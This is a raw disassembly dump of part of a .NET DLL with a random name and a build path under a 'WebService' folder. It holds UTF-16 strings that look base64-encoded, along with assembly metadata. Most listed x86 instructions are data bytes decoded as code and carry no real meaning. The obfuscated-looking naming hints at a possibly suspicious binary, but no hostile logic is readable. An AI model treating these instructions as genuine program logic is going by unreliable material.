10004c66:	55                   	push   %ebp
10004c67:	00 5a 00             	add    %bl,0x0(%edx)
10004c6a:	31 00                	xor    %eax,(%eax)
10004c6c:	68 00 73 00 55       	push   $0x55007300
10004c71:	00 55 00             	add    %dl,0x0(%ebp)
10004c74:	68 00 73 00 62       	push   $0x62007300
10004c79:	00 57 00             	add    %dl,0x0(%edi)
10004c7c:	6c                   	insb   (%dx),%es:(%edi)
10004c7d:	00 71 00             	add    %dh,0x0(%ecx)
10004c80:	56                   	push   %esi
10004c81:	00 46 00             	add    %al,0x0(%esi)
10004c84:	4a                   	dec    %edx
10004c85:	00 6f 00             	add    %ch,0x0(%edi)
10004c88:	57                   	push   %edi
10004c89:	00 47 00             	add    %al,0x0(%edi)
10004c8c:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
10004c90:	62 00                	bound  %eax,(%eax)
10004c92:	46                   	inc    %esi
10004c93:	00 46 00             	add    %al,0x0(%esi)
10004c96:	49                   	dec    %ecx
10004c97:	00 62 00             	add    %ah,0x0(%edx)
10004c9a:	47                   	inc    %edi
10004c9b:	00 31                	add    %dh,(%ecx)
10004c9d:	00 70 00             	add    %dh,0x0(%eax)
10004ca0:	61                   	popa
10004ca1:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10004ca5:	00 6e 00             	add    %ch,0x0(%esi)
10004ca8:	57                   	push   %edi
10004ca9:	00 47 00             	add    %al,0x0(%edi)
10004cac:	78 00                	js     0x10004cae
10004cae:	52                   	push   %edx
10004caf:	00 53 00             	add    %dl,0x0(%ebx)
10004cb2:	47                   	inc    %edi
10004cb3:	00 78 00             	add    %bh,0x0(%eax)
10004cb6:	74 00                	je     0x10004cb8
10004cb8:	61                   	popa
10004cb9:	00 57 00             	add    %dl,0x0(%edi)
10004cbc:	70 00                	jo     0x10004cbe
10004cbe:	55                   	push   %ebp
10004cbf:	00 52 00             	add    %dl,0x0(%edx)
10004cc2:	6e                   	outsb  %ds:(%esi),(%dx)
10004cc3:	00 63 00             	add    %ah,0x0(%ebx)
10004cc6:	39 00                	cmp    %eax,(%eax)
10004cc8:	5a                   	pop    %edx
10004cc9:	00 31                	add    %dh,(%ecx)
10004ccb:	00 68 00             	add    %ch,0x0(%eax)
10004cce:	73 00                	jae    0x10004cd0
10004cd0:	55                   	push   %ebp
10004cd1:	00 55 00             	add    %dl,0x0(%ebp)
10004cd4:	68 00 73 00 62       	push   $0x62007300
10004cd9:	00 57 00             	add    %dl,0x0(%edi)
10004cdc:	6c                   	insb   (%dx),%es:(%edi)
10004cdd:	00 71 00             	add    %dh,0x0(%ecx)
10004ce0:	56                   	push   %esi
10004ce1:	00 41 00             	add    %al,0x0(%ecx)
10004ce4:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10004ce9:	15 67 00 58 00       	adc    $0x580067,%eax
10004cee:	6c                   	insb   (%dx),%es:(%edi)
10004cef:	00 51 00             	add    %dl,0x0(%ecx)
10004cf2:	48                   	dec    %eax
10004cf3:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
10004cf7:	00 69 00             	add    %ch,0x0(%ecx)
10004cfa:	6a 00                	push   $0x0
10004cfc:	54                   	push   %esp
10004cfd:	00 00                	add    %al,(%eax)
10004cff:	03 ba 00 01 80 b9    	add    -0x467fff00(%edx),%edi
10004d05:	5a                   	pop    %edx
10004d06:	00 33                	add    %dh,(%ebx)
10004d08:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
10004d0c:	00 62 00             	add    %ah,0x0(%edx)
10004d0f:	57                   	push   %edi
10004d10:	00 31                	add    %dh,(%ecx)
10004d12:	00 4e 00             	add    %cl,0x0(%esi)
10004d15:	53                   	push   %ebx
10004d16:	00 33                	add    %dh,(%ebx)
10004d18:	00 56 00             	add    %dl,0x0(%esi)
10004d1b:	69 00 53 00 30 00    	imul   $0x300053,(%eax),%eax
10004d21:	78 00                	js     0x10004d23
10004d23:	74 00                	je     0x10004d25
10004d25:	56                   	push   %esi
10004d26:	00 6d 00             	add    %ch,0x0(%ebp)
10004d29:	64 00 35 00 63 00 47 	add    %dh,%fs:0x47006300
10004d30:	00 31                	add    %dh,(%ecx)
10004d32:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
10004d36:	00 55 00             	add    %dl,0x0(%ebp)
10004d39:	74 00                	je     0x10004d3b
10004d3b:	31 00                	xor    %eax,(%eax)
10004d3d:	59                   	pop    %ecx
10004d3e:	00 6b 00             	add    %ch,0x0(%ebx)
10004d41:	74 00                	je     0x10004d43
10004d43:	6e                   	outsb  %ds:(%esi),(%dx)
10004d44:	00 65 00             	add    %ah,0x0(%ebp)
10004d47:	58                   	pop    %eax
10004d48:	00 42 00             	add    %al,0x0(%edx)
10004d4b:	74 00                	je     0x10004d4d
10004d4d:	62 00                	bound  %eax,(%eax)
10004d4f:	55                   	push   %ebp
10004d50:	00 31                	add    %dh,(%ecx)
10004d52:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
10004d56:	00 57 00             	add    %dl,0x0(%edi)
10004d59:	4a                   	dec    %edx
10004d5a:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
10004d5e:	00 46 00             	add    %al,0x0(%esi)
10004d61:	70 00                	jo     0x10004d63
10004d63:	52                   	push   %edx
10004d64:	00 5a 00             	add    %bl,0x0(%edx)
10004d67:	33 00                	xor    (%eax),%eax
10004d69:	6c                   	insb   (%dx),%es:(%edi)
10004d6a:	00 77 00             	add    %dh,0x0(%edi)
10004d6d:	62 00                	bound  %eax,(%eax)
10004d6f:	57                   	push   %edi
10004d70:	00 31                	add    %dh,(%ecx)
10004d72:	00 4e 00             	add    %cl,0x0(%esi)
10004d75:	53                   	push   %ebx
10004d76:	00 33                	add    %dh,(%ebx)
10004d78:	00 56 00             	add    %dl,0x0(%esi)
10004d7b:	69 00 53 00 32 00    	imul   $0x320053,(%eax),%eax
10004d81:	64 00 35 00 63 00 47 	add    %dh,%fs:0x47006300
10004d88:	00 31                	add    %dh,(%ecx)
10004d8a:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
10004d8e:	00 55 00             	add    %dl,0x0(%ebp)
10004d91:	74 00                	je     0x10004d93
10004d93:	31 00                	xor    %eax,(%eax)
10004d95:	59                   	pop    %ecx
10004d96:	00 6b 00             	add    %ch,0x0(%ebx)
10004d99:	73 00                	jae    0x10004d9b
10004d9b:	39 00                	cmp    %eax,(%eax)
10004d9d:	50                   	push   %eax
10004d9e:	00 57 00             	add    %dl,0x0(%edi)
10004da1:	64 00 35 00 63 00 47 	add    %dh,%fs:0x47006300
10004da8:	00 31                	add    %dh,(%ecx)
10004daa:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
10004dae:	00 55 00             	add    %dl,0x0(%ebp)
10004db1:	74 00                	je     0x10004db3
10004db3:	31 00                	xor    %eax,(%eax)
10004db5:	59                   	pop    %ecx
10004db6:	00 6b 00             	add    %ch,0x0(%ebx)
10004db9:	73 00                	jae    0x10004dbb
10004dbb:	3d 00 00 15 67       	cmp    $0x67150000,%eax
10004dc0:	00 79 00             	add    %bh,0x0(%ecx)
10004dc3:	70 00                	jo     0x10004dc5
10004dc5:	6d                   	insl   (%dx),%es:(%edi)
10004dc6:	00 6d 00             	add    %ch,0x0(%ebp)
10004dc9:	4d                   	dec    %ebp
10004dca:	00 4b 00             	add    %cl,0x0(%ebx)
10004dcd:	75 00                	jne    0x10004dcf
10004dcf:	62 00                	bound  %eax,(%eax)
10004dd1:	4b                   	dec    %ebx
10004dd2:	00 00                	add    %al,(%eax)
10004dd4:	ca 30 21             	lret   $0x2130
10004dd7:	ed                   	in     (%dx),%eax
10004dd8:	f8                   	clc
10004dd9:	47                   	inc    %edi
10004dda:	8e 47 94             	mov    -0x6c(%edi),%es
10004ddd:	52                   	push   %edx
10004dde:	c6                   	(bad)
10004ddf:	ad                   	lods   %ds:(%esi),%eax
10004de0:	a9 76 39 48 00       	test   $0x483976,%eax
10004de5:	04 20                	add    $0x20,%al
10004de7:	01 01                	add    %eax,(%ecx)
10004de9:	08 03                	or     %al,(%ebx)
10004deb:	20 00                	and    %al,(%eax)
10004ded:	01 05 20 01 01 11    	add    %eax,0x11010120
10004df3:	11 04 20             	adc    %eax,(%eax,%eiz,1)
10004df6:	01 01                	add    %eax,(%ecx)
10004df8:	0e                   	push   %cs
10004df9:	04 20                	add    $0x20,%al
10004dfb:	01 01                	add    %eax,(%ecx)
10004dfd:	02 04 00             	add    (%eax,%eax,1),%al
10004e00:	00 12                	add    %dl,(%edx)
10004e02:	61                   	popa
10004e03:	05 00 01 1d 05       	add    $0x51d0100,%eax
10004e08:	0e                   	push   %cs
10004e09:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
10004e0e:	05 05 20 02 0e       	add    $0xe022005,%eax
10004e13:	0e                   	push   %cs
10004e14:	0e                   	push   %cs
10004e15:	0c 10                	or     $0x10,%al
10004e17:	01 02                	add    %eax,(%edx)
10004e19:	15 12 71 01 1e       	adc    $0x1e017112,%eax
10004e1e:	00 1e                	add    %bl,(%esi)
10004e20:	00 08                	add    %cl,(%eax)
10004e22:	03 0a                	add    (%edx),%ecx
10004e24:	01 0e                	add    %ecx,(%esi)
10004e26:	06                   	push   %es
10004e27:	15 12 59 02 0e       	adc    $0xe025912,%eax
10004e2c:	03 05 20 02 01 1c    	add    0x1c010220,%eax
10004e32:	18 17                	sbb    %dl,(%edi)
10004e34:	10 02                	adc    %al,(%edx)
10004e36:	02 15 12 71 01 1e    	add    0x1e017112,%dl
10004e3c:	01 15 12 71 01 1e    	add    %edx,0x1e017112
10004e42:	00 15 12 59 02 1e    	add    %dl,0x1e025912
10004e48:	00 1e                	add    %bl,(%esi)
10004e4a:	01 04 0a             	add    %eax,(%edx,%ecx,1)
10004e4d:	02 0e                	add    (%esi),%cl
10004e4f:	03 0c 10             	add    (%eax,%edx,1),%ecx
10004e52:	01 01                	add    %eax,(%ecx)
10004e54:	1d 1e 00 15 12       	sbb    $0x1215001e,%eax
10004e59:	71 01                	jno    0x10004e5c
10004e5b:	1e                   	push   %ds
10004e5c:	00 03                	add    %al,(%ebx)
10004e5e:	0a 01                	or     (%ecx),%al
10004e60:	03 05 20 01 01 1d    	add    0x1d010120,%eax
10004e66:	03 0c 07             	add    (%edi,%eax,1),%ecx
10004e69:	07                   	pop    %es
10004e6a:	11 0c 11             	adc    %ecx,(%ecx,%edx,1)
10004e6d:	10 18                	adc    %bl,(%eax)
10004e6f:	18 18                	sbb    %bl,(%eax)
10004e71:	12 49 09             	adc    0x9(%ecx),%cl
10004e74:	06                   	push   %es
10004e75:	10 01                	adc    %al,(%ecx)
10004e77:	01 08                	add    %ecx,(%eax)
10004e79:	1e                   	push   %ds
10004e7a:	00 04 0a             	add    %al,(%edx,%ecx,1)
10004e7d:	01 11                	add    %edx,(%ecx)
10004e7f:	0c 02                	or     $0x2,%al
10004e81:	06                   	push   %es
10004e82:	18 05 00 02 02 18    	sbb    %al,0x18020200
10004e88:	18 04 00             	sbb    %al,(%eax,%eax,1)
10004e8b:	01 01                	add    %eax,(%ecx)
10004e8d:	08 05 00 01 12 49    	or     %al,0x49120100
10004e93:	08 03                	or     %al,(%ebx)
10004e95:	20 00                	and    %al,(%eax)
10004e97:	02 06                	add    (%esi),%al
10004e99:	07                   	pop    %es
10004e9a:	02 12                	add    (%edx),%dl
10004e9c:	18 1d 0e 05 15 12    	sbb    %bl,0x1215050e
10004ea2:	5d                   	pop    %ebp
10004ea3:	01 0e                	add    %ecx,(%esi)
10004ea5:	05 20 01 01 13       	add    $0x13010120,%eax
10004eaa:	00 09                	add    %cl,(%ecx)
10004eac:	00 03                	add    %al,(%ebx)
10004eae:	1d 0e 0e 0e 11       	sbb    $0x110e0e0e,%eax
10004eb3:	80 85 06 15 12 59 02 	addb   $0x2,0x59121506(%ebp)
10004eba:	0e                   	push   %cs
10004ebb:	02 16                	add    (%esi),%dl
10004ebd:	10 01                	adc    %al,(%ecx)
10004ebf:	02 15 12 71 01 1e    	add    0x1e017112,%dl
10004ec5:	00 15 12 71 01 1e    	add    %dl,0x1e017112
10004ecb:	00 15 12 59 02 1e    	add    %dl,0x1e025912
10004ed1:	00 02                	add    %al,(%edx)
10004ed3:	04 20                	add    $0x20,%al
10004ed5:	01 08                	add    %ecx,(%eax)
10004ed7:	08 04 07             	or     %al,(%edi,%eax,1)
10004eda:	02 0e                	add    (%esi),%cl
10004edc:	0e                   	push   %cs
10004edd:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
10004ee2:	0e                   	push   %cs
10004ee3:	06                   	push   %es
10004ee4:	00 01                	add    %al,(%ecx)
10004ee6:	12 80 8d 0e 06 00    	adc    0x60e8d(%eax),%al
10004eec:	03 0e                	add    (%esi),%ecx
10004eee:	0e                   	push   %cs
10004eef:	0e                   	push   %cs
10004ef0:	0e                   	push   %cs
10004ef1:	06                   	push   %es
10004ef2:	00 03                	add    %al,(%ebx)
10004ef4:	01 0e                	add    %ecx,(%esi)
10004ef6:	0e                   	push   %cs
10004ef7:	02 03                	add    (%ebx),%al
10004ef9:	20 00                	and    %al,(%eax)
10004efb:	08 04 20             	or     %al,(%eax,%eiz,1)
10004efe:	01 03                	add    %eax,(%ebx)
10004f00:	08 04 00             	or     %al,(%eax,%eax,1)
10004f03:	01 0e                	add    %ecx,(%esi)
10004f05:	0e                   	push   %cs
10004f06:	05 20 01 02 13       	add    $0x13020120,%eax
10004f0b:	00 08                	add    %cl,(%eax)
10004f0d:	b7 7a                	mov    $0x7a,%bh
10004f0f:	5c                   	pop    %esp
10004f10:	56                   	push   %esi
10004f11:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
10004f14:	89 03                	mov    %eax,(%ebx)
10004f16:	06                   	push   %es
10004f17:	12 45 02             	adc    0x2(%ebp),%al
10004f1a:	06                   	push   %es
10004f1b:	09 02                	or     %eax,(%edx)
10004f1d:	06                   	push   %es
10004f1e:	0e                   	push   %cs
10004f1f:	02 06                	add    (%esi),%al
10004f21:	08 02                	or     %al,(%edx)
10004f23:	06                   	push   %es
10004f24:	06                   	push   %es
10004f25:	03 06                	add    (%esi),%eax
10004f27:	12 14 07             	adc    (%edi,%eax,1),%dl
10004f2a:	06                   	push   %es
10004f2b:	15 12 59 02 0e       	adc    $0xe025912,%eax
10004f30:	03 06                	add    (%esi),%eax
10004f32:	06                   	push   %es
10004f33:	15 12 5d 01 0e       	adc    $0xe015d12,%eax
10004f38:	04 00                	add    $0x0,%al
10004f3a:	01 02                	add    %eax,(%edx)
10004f3c:	18 06                	sbb    %al,(%esi)
10004f3e:	00 02                	add    %al,(%edx)
10004f40:	02 18                	add    (%eax),%bl
10004f42:	10 09                	adc    %cl,(%ecx)
10004f44:	11 00                	adc    %eax,(%eax)
10004f46:	0a 02                	or     (%edx),%al
10004f48:	0e                   	push   %cs
10004f49:	0e                   	push   %cs
10004f4a:	18 18                	sbb    %bl,(%eax)
10004f4c:	02 09                	add    (%ecx),%cl
10004f4e:	18 0e                	sbb    %cl,(%esi)
10004f50:	10 11                	adc    %dl,(%ecx)
10004f52:	0c 10                	or     $0x10,%al
10004f54:	11 10                	adc    %edx,(%eax)
10004f56:	08 00                	or     %al,(%eax)
10004f58:	05 18 18 18 09       	add    $0x9181818,%eax
10004f5d:	09 09                	or     %ecx,(%ecx)
10004f5f:	04 00                	add    $0x0,%al
10004f61:	01 0e                	add    %ecx,(%esi)
10004f63:	08 06                	or     %al,(%esi)
10004f65:	00 02                	add    %al,(%edx)
10004f67:	01 0e                	add    %ecx,(%esi)
10004f69:	1d 05 0b 00 07       	sbb    $0x7000b05,%eax
10004f6e:	18 18                	sbb    %bl,(%eax)
10004f70:	18 09                	sbb    %cl,(%ecx)
10004f72:	18 18                	sbb    %bl,(%eax)
10004f74:	09 10                	or     %edx,(%eax)
10004f76:	18 0a                	sbb    %cl,(%edx)
10004f78:	00 05 02 18 18 1d    	add    %al,0x1d181802
10004f7e:	05 09 10 18 03       	add    $0x3181009,%eax
10004f83:	00 00                	add    %al,(%eax)
10004f85:	01 03                	add    %eax,(%ebx)
10004f87:	00 00                	add    %al,(%eax)
10004f89:	0e                   	push   %cs
10004f8a:	04 20                	add    $0x20,%al
10004f8c:	01 03                	add    %eax,(%ebx)
10004f8e:	0e                   	push   %cs
10004f8f:	04 20                	add    $0x20,%al
10004f91:	01 02                	add    %eax,(%edx)
10004f93:	0e                   	push   %cs
10004f94:	08 01                	or     %al,(%ecx)
10004f96:	00 08                	add    %cl,(%eax)
10004f98:	00 00                	add    %al,(%eax)
10004f9a:	00 00                	add    %al,(%eax)
10004f9c:	00 1e                	add    %bl,(%esi)
10004f9e:	01 00                	add    %eax,(%eax)
10004fa0:	01 00                	add    %eax,(%eax)
10004fa2:	54                   	push   %esp
10004fa3:	02 16                	add    (%esi),%dl
10004fa5:	57                   	push   %edi
10004fa6:	72 61                	jb     0x10005009
10004fa8:	70 4e                	jo     0x10004ff8
10004faa:	6f                   	outsl  %ds:(%esi),(%dx)
10004fab:	6e                   	outsb  %ds:(%esi),(%dx)
10004fac:	45                   	inc    %ebp
10004fad:	78 63                	js     0x10005012
10004faf:	65 70 74             	gs jo  0x10005026
10004fb2:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10004fb9:	77 73                	ja     0x1000502e
10004fbb:	01 08                	add    %ecx,(%eax)
10004fbd:	01 00                	add    %eax,(%eax)
10004fbf:	02 00                	add    (%eax),%al
10004fc1:	00 00                	add    %al,(%eax)
10004fc3:	00 00                	add    %al,(%eax)
10004fc5:	13 01                	adc    (%ecx),%eax
10004fc7:	00 0e                	add    %cl,(%esi)
10004fc9:	42                   	inc    %edx
10004fca:	76 61                	jbe    0x1000502d
10004fcc:	43                   	inc    %ebx
10004fcd:	52                   	push   %edx
10004fce:	67 4b                	addr16 dec %ebx
10004fd0:	50                   	push   %eax
10004fd1:	71 6c                	jno    0x1000503f
10004fd3:	4d                   	dec    %ebp
10004fd4:	57                   	push   %edi
10004fd5:	65 50                	gs push %eax
10004fd7:	00 00                	add    %al,(%eax)
10004fd9:	05 01 00 00 00       	add    $0x1,%eax
10004fde:	00 17                	add    %dl,(%edi)
10004fe0:	01 00                	add    %eax,(%eax)
10004fe2:	12 43 6f             	adc    0x6f(%ebx),%al
10004fe5:	70 79                	jo     0x10005060
10004fe7:	72 69                	jb     0x10005052
10004fe9:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
10004fef:	20 20                	and    %ah,(%eax)
10004ff1:	32 30                	xor    (%eax),%dh
10004ff3:	32 34 00             	xor    (%eax,%eax,1),%dh
10004ff6:	00 29                	add    %ch,(%ecx)
10004ff8:	01 00                	add    %eax,(%eax)
10004ffa:	24 35                	and    $0x35,%al
10004ffc:	35 34 44 30 46       	xor    $0x46304434,%eax
10005001:	32 30                	xor    (%eax),%dh
10005003:	2d 36 33 31 37       	sub    $0x37313336,%eax
10005008:	2d 34 30 31 44       	sub    $0x44313034,%eax
1000500d:	2d 38 33 33 35       	sub    $0x35333338,%eax
10005012:	2d 46 30 35 41       	sub    $0x41353046,%eax
10005017:	44                   	inc    %esp
10005018:	43                   	inc    %ebx
10005019:	34 33                	xor    $0x33,%al
1000501b:	46                   	inc    %esi
1000501c:	32 41 44             	xor    0x44(%ecx),%al
1000501f:	00 00                	add    %al,(%eax)
10005021:	0c 01                	or     $0x1,%al
10005023:	00 07                	add    %al,(%edi)
10005025:	31 2e                	xor    %ebp,(%esi)
10005027:	30 2e                	xor    %ch,(%esi)
10005029:	30 2e                	xor    %ch,(%esi)
1000502b:	30 00                	xor    %al,(%eax)
1000502d:	00 49 01             	add    %cl,0x1(%ecx)
10005030:	00 1a                	add    %bl,(%edx)
10005032:	2e 4e                	cs dec %esi
10005034:	45                   	inc    %ebp
10005035:	54                   	push   %esp
10005036:	46                   	inc    %esi
10005037:	72 61                	jb     0x1000509a
10005039:	6d                   	insl   (%dx),%es:(%edi)
1000503a:	65 77 6f             	gs ja  0x100050ac
1000503d:	72 6b                	jb     0x100050aa
1000503f:	2c 56                	sub    $0x56,%al
10005041:	65 72 73             	gs jb  0x100050b7
10005044:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
1000504b:	38 01                	cmp    %al,(%ecx)
1000504d:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
10005051:	46                   	inc    %esi
10005052:	72 61                	jb     0x100050b5
10005054:	6d                   	insl   (%dx),%es:(%edi)
10005055:	65 77 6f             	gs ja  0x100050c7
10005058:	72 6b                	jb     0x100050c5
1000505a:	44                   	inc    %esp
1000505b:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
10005062:	61                   	popa
10005063:	6d                   	insl   (%dx),%es:(%edi)
10005064:	65 12 2e             	adc    %gs:(%esi),%ch
10005067:	4e                   	dec    %esi
10005068:	45                   	inc    %ebp
10005069:	54                   	push   %esp
1000506a:	20 46 72             	and    %al,0x72(%esi)
1000506d:	61                   	popa
1000506e:	6d                   	insl   (%dx),%es:(%edi)
1000506f:	65 77 6f             	gs ja  0x100050e1
10005072:	72 6b                	jb     0x100050df
10005074:	20 34 2e             	and    %dh,(%esi,%ebp,1)
10005077:	38 04 01             	cmp    %al,(%ecx,%eax,1)
	...
10005082:	00 00                	add    %al,(%eax)
10005084:	0f 8f e4 85 00 00    	jg     0x1000d66e
1000508a:	00 00                	add    %al,(%eax)
1000508c:	02 00                	add    (%eax),%al
1000508e:	00 00                	add    %al,(%eax)
10005090:	79 00                	jns    0x10005092
10005092:	00 00                	add    %al,(%eax)
10005094:	b8 50 00 00 b8       	mov    $0xb8000050,%eax
10005099:	32 00                	xor    (%eax),%al
	...
100050a7:	00 10                	add    %dl,(%eax)
	...
100050b5:	00 00                	add    %al,(%eax)
100050b7:	00 52 53             	add    %dl,0x53(%edx)
100050ba:	44                   	inc    %esp
100050bb:	53                   	push   %ebx
100050bc:	ee                   	out    %al,(%dx)
100050bd:	5b                   	pop    %ebx
100050be:	ed                   	in     (%dx),%eax
100050bf:	17                   	pop    %ss
100050c0:	eb de                	jmp    0x100050a0
100050c2:	0c 48                	or     $0x48,%al
100050c4:	aa                   	stos   %al,%es:(%edi)
100050c5:	4f                   	dec    %edi
100050c6:	37                   	aaa
100050c7:	1b cd                	sbb    %ebp,%ecx
100050c9:	7a 12                	jp     0x100050dd
100050cb:	7c 01                	jl     0x100050ce
100050cd:	00 00                	add    %al,(%eax)
100050cf:	00 43 3a             	add    %al,0x3a(%ebx)
100050d2:	5c                   	pop    %esp
100050d3:	55                   	push   %ebp
100050d4:	73 65                	jae    0x1000513b
100050d6:	72 73                	jb     0x1000514b
100050d8:	5c                   	pop    %esp
100050d9:	77 6f                	ja     0x1000514a
100050db:	72 6b                	jb     0x10005148
100050dd:	74 65                	je     0x10005144
100050df:	61                   	popa
100050e0:	6d                   	insl   (%dx),%es:(%edi)
100050e1:	5c                   	pop    %esp
100050e2:	44                   	inc    %esp
100050e3:	65 73 6b             	gs jae 0x10005151
100050e6:	74 6f                	je     0x10005157
100050e8:	70 5c                	jo     0x10005146
100050ea:	57                   	push   %edi
100050eb:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
100050ef:	72 76                	jb     0x10005167
100050f1:	69 63 65 5c 61 73 73 	imul   $0x7373615c,0x65(%ebx),%esp
100050f8:	65 74 73             	gs je  0x1000516e
100050fb:	5c                   	pop    %esp
100050fc:	62 69 6e             	bound  %ebp,0x6e(%ecx)
100050ff:	5c                   	pop    %esp
10005100:	74 65                	je     0x10005167
10005102:	6d                   	insl   (%dx),%es:(%edi)
10005103:	70 2d                	jo     0x10005132
10005105:	30 66 62             	xor    %ah,0x62(%esi)
10005108:	31 35 65 32 61 32    	xor    %esi,0x32613265
1000510e:	66 36 34 5c          	data16 ss xor $0x5c,%al
10005112:	6f                   	outsl  %ds:(%esi),(%dx)
10005113:	62 6a 5c             	bound  %ebp,0x5c(%edx)
10005116:	52                   	push   %edx
10005117:	65 6c                	gs insb (%dx),%es:(%edi)
10005119:	65 61                	gs popa
1000511b:	73 65                	jae    0x10005182
1000511d:	5c                   	pop    %esp
1000511e:	42                   	inc    %edx
1000511f:	76 61                	jbe    0x10005182
10005121:	43                   	inc    %ebx
10005122:	52                   	push   %edx
10005123:	67 4b                	addr16 dec %ebx
10005125:	50                   	push   %eax
10005126:	71 6c                	jno    0x10005194
10005128:	4d                   	dec    %ebp
10005129:	57                   	push   %edi
1000512a:	65 50                	gs push %eax
1000512c:	2e 70 64             	jo,pn  0x10005193
1000512f:	62 00                	bound  %eax,(%eax)
10005131:	59                   	pop    %ecx
10005132:	51                   	push   %ecx
	...
1000513b:	00 00                	add    %al,(%eax)
1000513d:	73 51                	jae    0x10005190
1000513f:	00 00                	add    %al,(%eax)
10005141:	00 20                	add    %ah,(%eax)
	...
10005157:	00 00                	add    %al,(%eax)
10005159:	65 51                	gs push %ecx
	...
10005167:	5f                   	pop    %edi
10005168:	43                   	inc    %ebx
10005169:	6f                   	outsl  %ds:(%esi),(%dx)
1000516a:	72 44                	jb     0x100051b0
1000516c:	6c                   	insb   (%dx),%es:(%edi)
1000516d:	6c                   	insb   (%dx),%es:(%edi)
1000516e:	4d                   	dec    %ebp
1000516f:	61                   	popa
10005170:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
10005177:	72 65                	jb     0x100051de
10005179:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
1000517d:	6c                   	insb   (%dx),%es:(%edi)
	...
10005186:	ff 25 00 20 00 10    	jmp    *0x10002000
